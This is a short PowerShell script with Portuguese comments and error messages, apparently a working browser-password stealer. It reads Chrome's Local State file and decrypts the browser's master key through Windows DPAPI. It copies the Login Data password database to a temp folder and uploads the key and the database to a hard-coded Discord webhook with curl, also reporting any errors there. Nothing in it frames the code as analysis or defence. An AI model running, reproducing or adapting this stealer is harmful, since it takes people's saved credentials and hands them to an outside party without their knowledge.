$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
Add-Type -AssemblyName System.Security

try {
    $path1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $path2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

    if (!(Test-Path $path1)) { curl.exe -F "content=ERRO:Arquivo_LocalState_Nao_Existe" $u; return }
    if (!(Test-Path $path2)) { curl.exe -F "content=ERRO:Arquivo_LoginData_Nao_Existe" $u; return }

    # Tenta pegar a chave
    $j = Get-Content $path1 -Raw | ConvertFrom-Json
    $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)[5..255]
    
    try {
        $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        $k = [Convert]::ToBase64String($m)
        curl.exe -F "content=CHAVE:$k" $u
    } catch {
        curl.exe -F "content=ERRO:Falha_na_Descriptografia_DPAPI" $u
    }

    # Tenta mandar o arquivo
    $t = "$env:TEMP\L.db"
    Copy-Item $path2 $t -Force
    curl.exe -F "file=@$t" $u

} catch {
    $err = $_.Exception.Message -replace ' ','_'
    curl.exe -F "content=ERRO_GERAL:$err" $u
}
